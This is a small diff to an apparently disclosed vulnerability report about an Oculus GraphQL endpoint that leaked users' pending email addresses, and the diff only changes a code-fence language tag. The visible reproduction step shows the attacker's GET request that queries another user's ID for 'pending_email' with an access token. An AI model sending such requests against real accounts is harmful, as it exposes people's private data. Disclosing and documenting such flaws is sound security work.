@@ -23,7 +23,7 @@ An unauthorised GraphQL query could return the pending (unconfirmed) email addre
 2. **UserB** (Attacker) issues the following GraphQL request, replacing `User_ID` with UserA_ID and using a valid Oculus access token :
 
 #### Request
-```
+```http
 GET https://graph.oculus.com/graphql?q=node(User_ID){pending_email}&access_token=OC|660728964057742|
 ```
 
